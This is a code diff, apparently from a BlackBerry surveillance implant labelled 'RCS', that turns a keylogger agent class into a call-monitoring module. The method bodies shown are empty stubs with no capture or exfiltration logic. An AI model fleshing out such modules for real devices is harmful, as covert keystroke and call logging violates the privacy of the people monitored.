@@ -2,46 +2,43 @@
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSBlackBerry
- * Package      : blackberry.agent
- * File         : KeyLogAgent.java
- * Created      : 28-apr-2010
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : CallAgent.java
+ * Created      : 26-mar-2010
  * *************************************************/
-package blackberry.agent;
+package blackberry.module;
 
-import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
 
 /**
- * The Class KeyLogAgent.
+ * The Class CallAgent.
  */
-public final class KeyLogAgent extends Module {
+public final class ModuleCall extends BaseModule {
     //#ifdef DEBUG
-    static Debug debug = new Debug("KeyLogAgent", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("CallAgent", DebugLevel.VERBOSE);
     //#endif
 
     /**
-     * Instantiates a new key log agent.
+     * Instantiates a new call agent.
      * 
      * @param agentStatus
      *            the agent status
      */
-    public KeyLogAgent(final boolean agentEnabled) {
-        super(Module.AGENT_KEYLOG, agentEnabled, Conf.AGENT_KEYLOG_ON_SD, "KeyLogAgent");
-
+    public ModuleCall(final boolean agentStatus) {
+        super(BaseModule.AGENT_CALL, agentStatus, true, "CallAgent");
     }
 
     /**
-     * Instantiates a new key log agent.
+     * Instantiates a new call agent.
      * 
      * @param agentStatus
      *            the agent status
      * @param confParams
      *            the conf params
      */
-    protected KeyLogAgent(final boolean agentStatus, final byte[] confParams) {
+    protected ModuleCall(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
@@ -51,6 +48,9 @@ public final class KeyLogAgent extends Module {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualGo() {
+        //#ifdef DEBUG
+        debug.trace("run");
+        //#endif
     }
 
     /*
@@ -58,7 +58,7 @@ public final class KeyLogAgent extends Module {
      * @see blackberry.agent.Agent#parse(byte[])
      */
     protected boolean parse(final byte[] confParameters) {
-        
+
         return false;
     }
 
